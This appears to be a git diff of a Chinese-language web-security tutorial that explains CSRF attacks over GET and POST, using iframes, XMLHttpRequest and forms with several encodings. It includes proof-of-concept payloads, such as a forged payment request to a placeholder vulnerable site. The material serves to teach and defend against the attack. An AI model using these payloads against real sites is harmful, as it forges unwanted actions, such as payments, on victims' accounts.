@@ -72,6 +72,7 @@ Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
 ```
 很容易看到,该请求中的Referer头说明了该get请求来自于第三方域(如果后端获取Referer的值 且是白名单方法验证其值 则CSRF利用失败)
 
+----
 
 **方法2** 利用`iframe`标签实现GET-CSRF
 
@@ -101,15 +102,15 @@ Connection: close
 
 ----
 
-**方法3** 利用`XMLHttpRequest`实现GET-CSRF
+**方法3** (不常用也不好用) 使用`XMLHttpRequest`实现GET-CSRF
 
-* 这种利用`XMLHttpRequest`的CSRF方法,通常仅适用于【同域】下利用CSRF.
-* 如果跨域就需要遵循CORS策略,这种方法通常很难实现跨域触发.
-* 因为`XMLHttpRequest`跨域必须遵循CORS策略. 所以利用`XMLHttpRequest`实现GET-CSRF的【前提条件】很高:
-* 目标站点`csrfvul.com`的HTTP Response Header中的`Access-Control-Allow-Origin:`中明确允许了来自某第三方域名`3.com`跨域请求,才能跨域成功
+* 【前提条件】很高: 使用JavaScript脚本发出request必须遵循SOP和CORS(跨域request遵循CORS策略).
+  * 使用JavaScript脚本发出request(如`XMLHttpRequest`) 仅适用于 "同域" 下发出request实现CSRF, 或符合CORS时可以发出跨域request实现CSRF.
+  * 因为客户端脚本发出跨域request必须遵循CORS策略. 即目标站点`csrfvul.com`的HTTP Response Header中的`Access-Control-Allow-Origin:`中明确允许了来自`3.com`的跨域请求,才能跨域成功.
 
 假如同域页面`csrfvul.com/js`下有以下代码:
-```
+
+```javascript
 <script>
 var xhr = new XMLHttpRequest();
 xhr.open("GET", "https://www.get.csrfvul.com/payto?name=hacker&moneynumb=100");
@@ -147,11 +148,15 @@ Referer: http://www.3.com/demo
 Accept-Encoding: gzip, deflate
 Accept-Language: zh-CN,zh;q=0.9
 ```
+
 可以看到来自第三方域名的、利用`XMLHttpRequest`发起的请求带有HTTP Request Header `Origin: https://www.3.com`
 
-所以,这种利用`XMLHttpRequest`的CSRF方法,通常仅适用于【同域】下利用CSRF.
+所以,这种利用`XMLHttpRequest`的CSRF方法, 通常仅适用于【同域】下利用CSRF.
 
-#### 【危害4】利用`XMLHttpRequest` 发出POST请求 完成CSRF攻击
+
+#### 【危害4】利用CSRF漏洞发出POST请求
+
+**方法1** 利用客户端脚本 如`XMLHttpRequest`发出POST跨域请求 完成CSRF
 
 ```javascript
 <script>
@@ -162,7 +167,9 @@ xh.send("username=abcd&status=on");
 </script>
 ```
 
-#### 【危害5】利用`form`标签 发出POST请求 完成CSRF攻击
+----
+
+**方法2** 利用`form`标签 发出POST跨域请求 完成CSRF
 
 * 场景
   * 目标域`csrfvul.com`存在CSRF漏洞
@@ -178,7 +185,8 @@ xh.send("username=abcd&status=on");
       * 2.`<form enctype="text/plain" ...`
       * 3.`<form enctype="multipart/form-data" ...`
 
-**情况1.URL编码`application/x-www-form-urlencoded`**
+
+情况1. **URL编码**`application/x-www-form-urlencoded`
 
 无感知触发
 
@@ -230,13 +238,13 @@ Origin: https://3.com
 Referer: https://3.com/
 ```
 
-------
+----
 
-**情况2.`text/plain`**
+情况2. **`text/plain`**
 
 PoC
 
-```
+```html
 <!--
 满足以下3个前提才能用:
 (1)HTTP POST req Body是JSON数据 或明文.
@@ -277,12 +285,12 @@ Origin: https://3.com
 Referer: https://3.com/demo
 ```
 
-------
+----
 
-**情况3. `multipart/form-data`**
+情况3. **`multipart/form-data`**
  
 PoC
-```
+```html
 <!--
 某些偏老的web应用就这样传参
 -->
